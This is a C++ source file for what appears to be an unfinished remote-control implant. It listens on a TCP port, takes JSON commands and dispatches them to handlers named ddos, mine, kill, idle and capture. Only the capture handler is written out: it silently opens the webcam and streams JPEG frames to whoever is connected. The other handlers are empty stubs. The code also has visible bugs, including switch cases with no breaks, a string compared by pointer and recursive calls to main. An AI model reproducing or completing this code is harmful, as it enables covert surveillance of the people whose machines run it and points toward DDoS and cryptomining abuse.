#include <sys/socket.h>
#include <opencv2/opencv.hpp>
#include <arpa/inet.h>
#include <unistd.h>
#include <vector>
#include <thread>
#include </opt/homebrew/Cellar/jsoncpp/1.9.5/include/json/json.h>
#define PORT 12000
#define BUFFER_SIZE 1024

void capture(Json::Value* root, int* sock) {
    const int* socket = sock;
    char response_buffer[BUFFER_SIZE];
    cv::VideoCapture cap(0);
    cv::Mat frame;
    std::vector<uchar> buffer;
    const std::vector<int> params = {cv::IMWRITE_JPEG_QUALITY, 80};

    while (true) {
        cap >> frame;
        cv::imencode(".jpg", frame, buffer, params);
        unsigned long frame_size = buffer.size();
        if (send(*socket, &frame_size, sizeof(frame_size), 0) < 0) {
            break;
        }
        if (send(*socket, buffer.data(), frame_size, 0) < 0) {
            break;
        }
        recv(*socket, &response_buffer, BUFFER_SIZE, 0);
        if (response_buffer == "disconnect") {
            break;
        }
    }
    close(*socket);
    cap.release();
}

void ddos(Json::Value* root, int* sock) {}
void kill(Json::Value* root, int* sock) {}
void mine(Json::Value* root, int* sock) {}
void idle(Json::Value* root, int* sock) {}

[[noreturn]] void dummy(Json::Value* root, int* sock) {}

struct function {
    void (*func)(Json::Value*, int*);
};

struct function manage_request(const char* request) {
    const char re = request[0];
    struct function result;
    switch (re) {
        //ddos
        case 'd':
            result.func = &ddos;
        //camera
        case 'c':
            result.func = &capture;
        //mine
        case 'm':
            result.func = &mine;
        //idle
        case 'i':
            result.func = &idle;
        //kill
        case 'k':
            result.func = &kill;
        default:
            result.func = &dummy;
    }
    return result;
}

Json::Value parse_request(const char* request) {
    Json::Value root;
    Json::Reader reader;
    const bool parsed = reader.parse(request, root);
    if (!parsed) {
        std::cout << "failed" << std::endl;
    }
    return root;
}

[[noreturn]] int main() {
    struct sockaddr_in address{};
    int addrlen = sizeof(address);
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, reinterpret_cast<struct sockaddr *>(&address), addrlen) > 0) {
        // ReSharper disable once CppDFAInfiniteRecursion
        main();
    }
    if (listen(server_fd, 10) > 0) {
        // ReSharper disable once CppDFAInfiniteRecursion
        main();
    }
    server_fd = accept(server_fd, reinterpret_cast<struct sockaddr *>(&address), reinterpret_cast<socklen_t *>(&addrlen));

    while (true) {
        char buffer[BUFFER_SIZE];
        recv(server_fd, &buffer, sizeof(buffer), 0);
        if (strlen(buffer) > 0) {
            Json::Value root = parse_request(buffer);
            const struct function func = manage_request(root["request"].asCString());
            func.func(&root, &server_fd);
        }
    }
}
